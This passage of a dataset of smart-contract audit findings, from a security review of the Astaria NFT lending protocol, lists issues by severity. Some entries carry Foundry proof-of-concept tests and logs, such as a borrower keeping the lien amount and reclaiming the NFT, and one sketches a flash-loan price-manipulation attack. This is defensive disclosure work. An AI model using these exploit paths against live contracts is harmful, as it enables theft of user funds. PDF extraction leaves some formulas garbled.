against the dummy NFT (lienId, ) = _commitToLien({ vault: payable(privateVault), strategist: owner, strategistPK: ownerPK, tokenContract: tokenContract, tokenId: tokenId, lienDetails: ILienToken.Details({ maxAmount: 1 wei, rate: 1, duration: 1 hours, maxPotentialDebt: 0 ether, liquidationInitialAsk: 1 ether }), amount: 1 wei, revertMessage: \"\" }); console2.log(\"[+] borrowed 1 wei against the private vault.\"); lienId: %s\", lienId); console2.log(\" owner of lienId: %s\\n\\n\", LIEN_TOKEN.ownerOf(lienId)); console2.log(\" assertEq( LIEN_TOKEN.ownerOf(lienId), owner, \"owner should be the owner of the lienId.\" ); } { console2.log(\"--- test public vault shutdown ---\"); uint256 ownerPK = uint256(0xa77ac322); address owner = vm.addr(ownerPK); vm.label(owner, \"owner\"); uint256 lienId; TestNFT nft = new TestNFT(1); address tokenContract = address(nft); uint256 tokenId = uint256(0); address publicVault = _createPublicVault(owner, owner, 14 days); vm.label(publicVault, \"publicVault\"); console2.log(\"[+] public vault is created: %s\", publicVault); // lend 1 wei to the publicVault _lendToVault( Lender({addr: owner, amountToLend: 1 ether}), payable(publicVault) ); 15 console2.log(\"[+] lent 1 ether to the public vault.\"); console2.log(\"[+] shudown public vault.\"); vm.startPrank(owner); Vault(payable(publicVault)).shutdown(); vm.stopPrank(); assertEq( Vault(payable(publicVault)).getShutdown(), true, \"Public Vault should be shutdown.\" ); // borrow 1 wei against the dummy NFT (lienId, ) = _commitToLien({ vault: payable(publicVault), strategist: owner, strategistPK: ownerPK, tokenContract: tokenContract, tokenId: tokenId, lienDetails: ILienToken.Details({ maxAmount: 1 wei, rate: 1, duration: 1 hours, maxPotentialDebt: 0 ether, liquidationInitialAsk: 1 ether }), amount: 1 wei, revertMessage: \"\" }); console2.log(\"[+] borrowed 1 wei against the public vault.\"); console2.log(\" console2.log(\" lienId: %s\", lienId); owner of lienId: %s\", LIEN_TOKEN.ownerOf(lienId)); assertEq( LIEN_TOKEN.ownerOf(lienId), publicVault, \"Public vault should be the owner of the lienId.\" ); } } forge t --mt testScenario12 --ffi -vvv: 16 --- test private vault shutdown --- [+] private vault is created: 0x7BF14E2ad40df80677D356099565a08011B72d66 [+] lent 1 wei to the private vault. [+] shudown private vault. [+] borrowed 1 wei against the private vault. lienId: 78113226609386929237635937490344951966356214732432064308195118046023211325984 owner of lienId: 0x60873Bc6F2C9333b465F60e461cf548EfFc7E6EA --- test public vault shutdown --- [+] public vault is created: 0x5b1A54d097AA8Ce673b6816577752F6dfc10Ddd6 [+] lent 1 ether to the public vault. [+] shudown public vault. [+] borrowed 1 wei against the public vault. lienId: 13217102800774263219074199159187108198090219420208960450275388834853683629020 owner of lienId: 0x5b1A54d097AA8Ce673b6816577752F6dfc10Ddd6", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "transfer(...) function in _issuePayout(...) can be replaced by a direct call", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In the _issuePayout(...) internal function of the VaultImplementation if the asset is WETH the amount is withdrawn from WETH to native tokens and then transfered to the borrower: if (asset() == WETH()) { IWETH9 wethContract = IWETH9(asset()); wethContract.withdraw(newAmount); payable(borrower).transfer(newAmount); } transfer limits the amount of gas shared to the call to the borrower which would prevent executing a complex callback and due to changes in gas prices in EVM it might even break some feature for a potential borrower contract. For the analysis of the flow for both types of vaults please refer to the following issue:  'Storage parameters are updated after a few callback sites to external addresses in the commitToLien(...) flow'", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Storage parameters are updated after a few callback sites to external addresses in the commit- ToLien(...) flow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In the commitToLien(...) flow the following storage parameters are updated after some of the external call back sites when payout is issued or a lien is transferred from a private vault to its owner: 26  collateralStateHash in LienToken: One can potentially re-enter to take another lien using the same col- lateral, but this is not possible since the collateral NFT token is already transferred to the CollateralToken (unless one is dealing with some esoteric NFT token). The createLien(...) requires this parameter to be 0., and that's why a potential re-entrancy can bypass this requirement. | Read re-entrancy: Yes  slope in PublicVault: - | Read re-entrancy: Yes  liensOpenForEpoch in PublicVault: If flash liens are allowed one can re-enter and process the epoch before finishing the commitToLien(...). And so the processed epoch would have open liens even though we would want to make sure this could not happen | Read re-entrancy: Yes The re-entrancies can happen if the vault asset performs a call back to the receiver when transferring tokens (during issuance of payouts). And if one is dealing with WETH, the native token amount is transfer(...) to the borrower. Note in the case of Native tokens if the following recommendation from the below issue is considered the current issue could be of higher risk:  'transfer(...) function in _issuePayout(...) can be replaced by a direct call'", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "UNI_V3Validator fetches spot prices that may lead to price manipulation attacks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "UNI_V3Validator.validateAndParse() checks the state of the Uniswap V3 position. This includes checking the LP value through LiquidityAmounts.getAmountsForLiquidity. //get pool state //get slot 0 (uint160 poolSQ96, , , , , , ) = IUniswapV3PoolState( V3_FACTORY.getPool(token0, token1, fee) ).slot0(); (uint256 amount0, uint256 amount1) = LiquidityAmounts .getAmountsForLiquidity( poolSQ96, TickMath.getSqrtRatioAtTick(tickLower), TickMath.getSqrtRatioAtTick(tickUpper), liquidity );  LiquidityAmounts.sol#L177-L221 When we deep dive into getAmountsForLiquidity, we see three cases. Price is below the range, price is within the range, and price is above the range. 28 function getAmountsForLiquidity( uint160 sqrtRatioX96, uint160 sqrtRatioAX96, uint160 sqrtRatioBX96, uint128 liquidity ) internal pure returns (uint256 amount0, uint256 amount1) { unchecked { if (sqrtRatioAX96 > sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96); if (sqrtRatioX96 <= sqrtRatioAX96) { amount0 = getAmount0ForLiquidity( sqrtRatioAX96, sqrtRatioBX96, liquidity ); } else if (sqrtRatioX96 < sqrtRatioBX96) { amount0 = getAmount0ForLiquidity( sqrtRatioX96, sqrtRatioBX96, liquidity ); amount1 = getAmount1ForLiquidity( sqrtRatioAX96, sqrtRatioX96, liquidity ); } else { amount1 = getAmount1ForLiquidity( sqrtRatioAX96, sqrtRatioBX96, liquidity ); } } } For simplicity, we can break into getAmount1ForLiquidity 29 /// @notice Computes the amount of token1 for a given amount of liquidity and a price range /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary /// @param liquidity The liquidity being valued /// @return amount1 The amount of token1 function getAmount1ForLiquidity( uint160 sqrtRatioAX96, uint160 sqrtRatioBX96, uint128 liquidity ) internal pure returns (uint256 amount1) { unchecked { if (sqrtRatioAX96 > sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96); return FullMathUniswap.mulDiv( liquidity, sqrtRatioBX96 - sqrtRatioAX96, FixedPoint96.Q96 ); } } is calculated as amount = liquidity * (upper price - lower price). When the We find the amount slot0.poolSQ96 is in lp range, the lower price is the slot0.poolSQ96, the closer slot0 is to lowerTick, the smaller the amount1 is. This is vulnerable to price manipulation attacks as IUniswapV3PoolState.slot0.poolSQ96 is effectively the spot price. Attackers can acquire huge funds through flash loans and shift theslot0 by doing large swaps on Uniswap. Assume the following scenario, the strategist sign a lien that allows the borrower to provide ETH-USDC position with > 1,000,000 USDC and borrow 1,000,000 USDC from the vault.  Attacker can first provides 1 ETH worth of lp at price range 2,000,000 ~ 2,000,001.  The attacker borrows flash loan to manipulate the price of the pool and now the slot0.poolSQ96 = sqrt(2,000,000). (ignoring the decimals difference.  getAmountsForLiquidity value the LP positions with the spot price, and find the LP has 1 * 2,000,000 USDC in the position. The attacker borrows 2,000,000  Restoring the price of Uniswap pool and take the profit to repay the flash loan. Note that the project team has stated clearly that UNI_V3Validator will not be used before the audit. This issue is filed to provide information to the codebase.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Users pay protocol fee for interests they do not get", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The PublicVault._handleStrategistInterestReward() function currently charges a protocol fee from minting vault shares, affecting all vault LP participants. However, not every user receives interest payments. Consequently, a scenario may arise where a user deposits funds into the PublicVault before a loan is repaid, resulting in the user paying more in protocol fees than the interest earned. This approach appears to be unfair to certain users, leading to a disproportionate fee structure for those who do not benefit from the interest rewards.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Seaport auctions not compatible with USDT", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "As per ERC20 specification, approve() returns a boolean function approve(address _spender, uint256 _value) public returns (bool success) However, USDT deviates from this standard and it's approve() method doesn't have a return value. Hence, if USDT is used as a payment token, the following line reverts in validateOrder() as it expects return data but doesn't receive it: paymentToken.approve(address(transferProxy), s.LIEN_TOKEN.getOwed(stack));", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Borrowers cannot provide slippage protection parameters when committing to a lien", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "When a borrower commits to a lien, AstariaRouter calls the strategy validator to fetch the lien details (bytes32 leaf, ILienToken.Details memory details) = IStrategyValidator( strategyValidator ).validateAndParse( commitment.lienRequest, msg.sender, commitment.tokenContract, commitment.tokenId ); details include rate, duration, liquidationInitialAsk: struct Details { uint256 maxAmount; uint256 rate; //rate per second uint256 duration; uint256 maxPotentialDebt; // not used anymore uint256 liquidationInitialAsk; } The borrower cannot provide slippage protection parameters to make sure these 3 values cannot enter into some undesired ranges.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "The liquidation's auction starting price is not chosen perfectly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "When a lien is expired and liquidated the starting price for its Seaport auction is chosen as stack.lien.details.liquidationInitialAs. It would make more sense to have the startingPrice to be the maximum of the amount owed up to now and the stack.lien.details.liquidationInitialAsk ps = max(Lin, aowed ) For example if the liquidate(...) endpoint is called way after the lien's expiration time the amount owed might be bigger than the stack.lien.details.liquidationInitialAsk. When a lien is created the protocol checks that stack.lien.details.liquidationInitialAsk is not smaller than the to-be-owed amount at the end of the lien's term. But the lien can keep accruing interest if it is not liquidated right away when it gets expired.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "Canceled Seaport auctions can still be claimed by the liquidator", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Canceled auctions can still be claimed by the liquidator if ( s.idToUnderlying[collateralId].auctionHash != s.SEAPORT.getOrderHash(getOrderComponents(params, counterAtLiquidation)) ) { //revert auction params don't match revert InvalidCollateralState( InvalidCollateralStates.INVALID_AUCTION_PARAMS ); } If in the future we would add an authorised endpoint that could call s.SEAPORT.incrementCounter() to cancel all outstanding NFT auctions, the liquidator can call this endpoint liquidatorNFTClaim(..., counterAtLiq- uidation) where counterAtLiquidation is the old counter to claim its NFT after the canceled Seaport auction ends.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "The risk of bad debt is transferred to the non-redeeming shareholders and not the redeeming holders", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Right before a successful epochProcess(), the total assets A equals to + P(s,tl )2U2 a(s, tl ) A = y0 + s(t (cid:0) tlast ) = B + a(s, t) X s2U1 All the parameter values in the below table are considered as just before calling the processEpoch() endpoint unless stated otherwise.  A | totalAssets() |  y0 | yIntercept |  s | slope |  tlast | lasttimestamp used to update y0 or s |  t | block.timestamp |  B | ERC20(asset()).balanceOf(PublicVault), underlying balance of the public vault |  U1 | The set of active liens/stacks owned by the PublicVault, this can be non-empty due to how long the lien durations can be |  U2 | The set of liquidated liens/stacks and their corresponding liquidation timestamp ( tl ) which are owned by the current epoch's WithdrawProxy Wecurr . These liens belong to the current epoch, but their auction ends in the next epoch duration. |  a(s, t) | total amount owned by the stack s up to the timestamp t.  S | totalSupply().  SW | number of shares associated with the current epoch's WithdrawProxy ,currentWithdrawProxy.totalSupply() |  E | currentWithdrawProxy.getExpected(). 35 0 | yIntercept after calling epochProcess().  wr | withdrawReserve this is the value after calling epochProcess().  y 0  tp | last after calling epochProcess().  A0 | totalAssets after calling epochProcess().  Wn | the current epoch's WithdrawProxy before calling epochProcess().  Wn+1 | the current epoch's WithdrawProxy after calling epochProcess(). Also assume that claim() was already called on the previous epoch's WithdrawProxy if needed. After the call to epochProcess() (in the same block), we would have roughly (not considering the division errors) A0 = y 0 0 + s(t (cid:0) tp) A0 = (1 (cid:0) SW S )A + X s2U1 (a(s, t) (cid:0) a(s, tp)) wr = ( SW S ) B + a(s, tp) X s2U1 A = A0 + wr + ( SW S ) X (s,tl )2U2 a(s, tl ) (cid:0)(cid:1)A = wr + ( SW S )E and so: To be able to call processEpoch() again we need to make sure wr tokens have been transferred to Wn either from the public vault's assets B or from Wn+1 assets. Note that at this point wr equals to wr = SW S B + SW S X s2U1 a(s, tp) SW S B is an actual asset and can be transferred to Wn right away. The The a(s, tp) portion is a percentage of the amount owed by active liens at the time the processEpoch() was called. Depending on whether these liens get paid fully or not we would have: SW S Ps2U1  If they get fully paid there are no risks for the future shareholders to bare.  If these liens are not fully paid since we have transferred a(s, tp) from the actual asset balance to Wn the redeeming shareholder would not take the risk of these liens getting liquidated for less than their value. But these risks are transferred to the upcoming shareholders or the shareholders who have not redeemed their positions yet. SW S Ps2U1", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "validateOrder(...) does not check the consideration amount against its token balance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "When a lien position gets liquidated the CollateralToken creates a full restricted Seaport auction with itself as both the offerer and the zone. This will cause Seaport to do a callback to the CollateralToken's validateOrder(...) endpoint at the end of order fulfilment/matching. In this endpoint we have: uint256 payment = zoneParameters.consideration[0].amount; This payment amount is not validated.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "If the auction window is 0, the borrower can keep the lien amount and also take back its collater- alised NFT token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "If an authorised entity would file to set the auctionWindow to 0, borrowers can keep their lien amount and also take back their collateralised NFT tokens. Below is how this type of vulnerability works. 1. A borrower takes a lien from a vault by collateralising its NFT token. 2. Borrower let the time pass so that its lien/stack position can be liquidated. 3. The borrower atomically liquidates and then calls the liquidatorNFTClaim(...) endpoint of the Collater- alToken. The timestamps are as follows: s (cid:20) t lien t lien e = t auction s = t auction e We should note that in step 3 above when the borrower liquidates its own position, the CollateralToken creates a Seaport auction by calling its validate(...) endpoint. But this endpoint does not validate the orders timestamps so even though the timestamps provided are not valid when one tries to fulfil/match the order since Seaport requires that t auction . Thus, in . So it is not possible to fulfil/match an order where t auction (cid:20) tnow < t auction = t auction e e s s 37 step 3 it is not needed to call liquidatorNFTClaim(...) immediately as the auction created cannot be fulfilled by anyone. // add the following test case to // file: src/test/LienTokenSettlementScenarioTest.t.sol function _createUser(uint256 pk, string memory label) internal returns(address addr) { uint256 ownerPK = uint256(pk); addr = vm.addr(ownerPK); vm.label(addr, label); } function testScenario14() public { // allow flash liens - liens that can be liquidated in the same block that was committed IAstariaRouter.File[] memory files = new IAstariaRouter.File[](1); files[0] = IAstariaRouter.File( IAstariaRouter.FileType.AuctionWindow, abi.encode(uint256(0)) ); ASTARIA_ROUTER.fileBatch(files); console2.log(\"[+] set auction window to 0.\"); { } { address borrower1 = _createUser(0xb055033501, \"borrower1\"); address vaultOwner = _createUser(0xa77ac3, \"vaultOwner\"); address publicVault = _createPublicVault(vaultOwner, vaultOwner, 14 days); vm.label(publicVault, \"publicVault\"); console2.log(\"[+] public vault is created: %s\", publicVault); console2.log(\"vault start: %s\", IPublicVault(publicVault).START()); skip(14 days); _lendToVault( Lender({addr: vaultOwner, amountToLend: 10 ether}), payable(publicVault) ); TestNFT nft1 = new TestNFT(1); address tokenContract1 = address(nft1); uint256 tokenId1 = uint256(0); nft1.transferFrom(address(this), borrower1, tokenId1); vm.startPrank(borrower1); (uint256 lienId,ILienToken.Stack memory stack) = _commitToLien({ vault: payable(publicVault), strategist: vaultOwner, strategistPK: 0xa77ac3, tokenContract: tokenContract1, tokenId: tokenId1, lienDetails: ILienToken.Details({ maxAmount: 2 ether, rate: 1e8, duration: 1 hours, maxPotentialDebt: 0 ether, liquidationInitialAsk: 10 ether }), amount: 2 ether, 38 revertMessage: \"\" }); console2.log(\"ETH balance of the borrower: %s\", borrower1.balance); skip(1 hours); console2.log(\"[+] lien created with 0 duration. lineId: %s\", lienId); OrderParameters memory params = _liquidate(stack); console2.log(\"[+] lien liquidated by the borrower.\"); COLLATERAL_TOKEN.liquidatorNFTClaim( stack, params, COLLATERAL_TOKEN.SEAPORT().getCounter(address(COLLATERAL_TOKEN)) ); console2.log(\"[+] liquidator/borrower claimed NFT.\\n\"); vm.stopPrank(); console2.log(\"owner of the NFT token: %s\", nft1.ownerOf(tokenId1)); console2.log(\"ETH balance of the borrower: %s\", borrower1.balance); assertEq( nft1.ownerOf(tokenId1), borrower1, \"the borrower should own the NFT\" ); assertEq( borrower1.balance, 2 ether, \"borrower should still have the lien amount.\" ); } } forge t --mt testScenario14 --ffi -vvv: [+] set auction window to 0. [+] public vault is created: 0x4430c0731d87768Bf65c60340D800bb4B039e2C4 vault start: 1 ETH balance of the borrower: 2000000000000000000 [+] lien created with 0 duration. lineId: ,! [+] lien liquidated by the borrower. [+] liquidator/borrower claimed NFT. 91310819262208864484407122336131134788367087956387872647527849353935417268035 owner of the NFT token: 0xA92D072d39E6e0a584a6070a6dE8D88dfDBae2C7 ETH balance of the borrower: 2000000000000000000", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "An owner might not be able to cancel all signed liens by calling incrementNonce()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "If the vault owner or the delegate is phished into signing terms with consecutive nonces in a big range, they would not be able to cancel all those terms with the current incrementNonce() implementation as this value is only incrementing the nonce one at a time. As an example Seaport increments their counters using the following formula n += blockhash(block.number - 1) << 0x80;", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Error handling for USDT transactions in TransferProxy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "To handle edge cases where the receiver is blacklisted, TransferProxy.tokenTransferFromWithErrorReceiver(...) is designed to catch errors that may occur during the first transfer attempt and then proceed to send the tokens to the error receiver. try ERC20(token).transferFrom(from, to, amount) {} catch { _transferToErrorReceiver(token, from, to, amount); } However, it's worth noting that this approach may not be compatible with non-standard ERC20 tokens (e.g., USDT) that do not return any value after a transferFrom operation. The try-catch pattern in Solidity can only catch errors resulting from reverted external contract calls, but it does not handle errors caused by inconsistent return values. Consequently, when using USDT, the entire transaction will revert.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "PublicVault does not handle funds in errorReceiver", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "involves PROXY.tokenTransferFromWithErrorReceiver. The implementation in the TransferProxy contract involves sending the tokens to an error receiver that is con- trolled by the original receiver. However, this approach can lead to accounting errors in the PublicVault as PublicVault does not pull tokens from the error receiver. process transferProxy.TRANSFER_- LienToken.MakePayment(...), function from the in the tokens using user the to function tokenTransferFromWithErrorReceiver( // ... ) { try ERC20(token).transferFrom(from, to, amount) {} catch { _transferToErrorReceiver(token, from, to, amount); } } Note that, in practice, tokens would not be transferred to the error receiver. The issue is hence considered to be a low-risk issue.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Inconsistent Vault Fee Charging during Loan Liquidation via WithdrawProxy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In the smart contract code of PublicVault, there is an inconsistency related to the charging of fees when a loan is liquidated at epoch's roll and the lien is sent to WithdrawProxy. The PublicVault.owner is supposed to take a ratio of the interest paid as the strategist's reward, and the fee should be charged when a payment is made in the function PublicVault.updateVault(...), regardless of whether it's a normal payment or a liquidation payment. It appears that the fee is not being charged when a loan is liquidated at epoch's roll and the lien is sent to With- drawProxy. This discrepancy could potentially lead to an inconsistent distribution of fees and rewards.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "VaultImplementation.init(...) silently initialised when the allowlist parameters are not throughly validated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In VaultImplementation.init(...), if params.allowListEnabled is false but params.allowList is not empty, s.allowList does not get populated.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Several functions in AstariaRouter can be made non-payable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Following functions in AstariaRouter are payable when they should never be sent the native token: mint(), deposit(), withdraw(), redeem(), pullToken()", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Loan duration can be reduced at the time of borrowing without user permission", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Requested loan duration, if greater than the maximum allowed duration (the time to next epoch's end), is set to this maximum value: if (timeToSecondEpochEnd < lien.details.duration) { lien.details.duration = timeToSecondEpochEnd; } This happens without explicit user permission.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Native tokens sent to DepositHelper can get locked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "DepositHelper has the following two endpoints: fallback() external payable {} receive() external payable {} If one calls this contract by not supplying the deposit(...) function signature, the msg.value provided would get locked in this contract.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Updated ...EpochLength values are not validated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Sanity check is missing for updated s.minEpochLength and s.maxEpochLength. Need to make sure s.minEpochLength <= s.maxEpochLength", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "CollateralToken's conduit would have an open channel to an old Seaport when Seaport is updated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "After filing for a new Seaport the old Seaport would still have an open channel to it from the Col- lateralToken's conduit (assuming the old and new Seaport share the same conduit controller).", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "CollateralToken's tokenURI uses the underlying assets's tokenURI", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Since the CollateralToken positions can be sold on secondary markets like OpenSea, the tokenURI endpoint should be customised to avoid misleading users and it should contain information relating to the Collat- eralToken and not just its underlying asset. It would also be great to pull information from its associated lien to include here.  What-is-OpenSea-s-copymint-policy.  docs.opensea.io/docs/metadata-standards.  Necromint got banned on OpenSea.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Filing to update one of the main contract for another main contract lacks validation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The main contracts AstariaRouter, CollateralToken, and LienToken all need to be aware of each other and form a connected triangle. They are all part of a single unit and perhaps are separated into 3 different contract due to code size and needing to have two individual ERC721 tokens. Their authorised filing structure is as follows:  Note that one cannot file for CollateralToken to change LienToken as the value of LienToken is only set during the CollateralToken's initialisation. If one files to change one of these nodes and forget to check or update the links between these contract, the triangle above would be broken.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "TRANSFER_PROXY is not queried in a consistent fashion.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Different usages of TRANSFER_PROXY and how it is queried  AstariaRouter: Used in pullToken(...) to move tokens from the msg.sender to a another address.  CollateralToken: Used in validateOrder(...) where Seaport has callbacked into. Here Collateral- Token gives approval to TRANSFER_PROXY which is queried from AstariaRouter for the settlement tokens. TRANSFER_PROXY is also used to transfer tokens. 47  LienToken: In _payment(...) TRANSFER_PROXY is used to transfer tokens from CollateralToken to the lien owner. This implies that the TRANSFER_PROXY used in CollateralToken should be the same that is used in LienToken. Therefore, from the above we see that: 1. TRANSFER_PROXY holds tokens approvals for ERC20 or wETH tokens used as lien tokens. 2. TRANSFER_PROXY's address should be the same at all call sites for the different contract AstariaRouter, CollateralToken and LienToken. 3. Except CollateralToken which queries TRANSFER_PROXY from AstariaRouter, the other two contract As- tariaRouter and LienToken read this value from their storage. Note that the deployment script sets assigns the same TRANSFER_PROXY to all the 3 main contracts in the codebase AstariaRouter, CollateralToken, and LienToken.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Multicall when inherited to ERC4626RouterBase does not bubble up the reverts correctly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Multicall does not bubble up the reverts correctly. The current implementation uses the following snippet to bubble up the reverts // https://github.com/AstariaXYZ/astaria-gpl/blob/.../src/Multicall.sol pragma solidity >=0.7.6; if (!success) { // Next 5 lines from https://ethereum.stackexchange.com/a/83577 if (result.length < 68) revert(); assembly { result := add(result, 0x04) } revert(abi.decode(result, (string))); } 48 // https://github.com/AstariaXYZ/astaria-gpl/blob/.../src/ERC4626RouterBase.sol pragma solidity ^0.8.17; ... abstract contract ERC4626RouterBase is IERC4626RouterBase, Multicall { ... } This method of bubbling up does not work with new types of errors:  Panic(uint256) 0.8.0 (2020-12-16)  Custom errors introduced in 0.8.4 (2021-04-21)  ...", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Cache VAULT().ROUTER().LIEN_TOKEN()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "leads to extra external calls.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "s.currentEpoch can be cached in processEpoch()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "s.currentEpoch is being read from the storage multiple times in the processEpoch().", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Use basis points for ratios", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Fee ratios are represented through two state variables for numerator and denominator. Basis point system can be used in its place as it is simpler (denominator always set to 10_000), and gas efficient as denomi- nator is now a constant.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "liquidatorNFTClaim()'s arguments can be made calldata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The following arguments can be converted to calldata to save gas on copying them to memory: function liquidatorNFTClaim( ILienToken.Stack memory stack, OrderParameters memory params, uint256 counterAtLiquidation ) external whenNotPaused {", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "a.mulDivDown(b,1) is equivalent to a*b", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Highlighted code below the pattern of a.mulDivDown(b, 1) which is equivalent to a*b except the revert parameters in case of an overflow return uint256(s.slope).mulDivDown(delta_t, 1) + uint256(s.yIntercept);", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "try/catch can be removed for simplicity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The following code catches a revert in the external call WETH.deposit{value: owning}() and then reverts itself in the catch clause try WETH.deposit{value: owing}() { WETH.approve(transferProxy, owing); // make payment lienToken.makePayment(stack); // check balance if (address(this).balance > 0) { // withdraw payable(msg.sender).transfer(address(this).balance); } } catch { revert(); } This effect can also be achieved without using try/catch which simplifies the code too.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Cache s.idToUnderlying[collateralId].auctionHash", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In liquidatorNFTClaim(...), s.idToUnderlying[collateralId].auctionHash is read twice from the storage.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Cache keccak256(abi.encode(stack))", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In LienToken._handleLiquidation(...) lienId is calculated as uint256 lienId = uint256(keccak256(abi.encode(stack))); Note that _handleLiquidation(...) is called by handleLiquidation(...) which has a modifier validateCol- lateralState(...): validateCollateralState( stack.lien.collateralId, keccak256(abi.encode(stack)) ) And thus keccak256(abi.encode(stack)) is performed twice. The same multiple hashing calculation also hap- pens in makePayment(...) flow. to cache the keccak256(abi.encode(stack)) value for the above", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Functions can be made view or pure", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Several functions can be view or pure. Compiler also warns about these functions. For 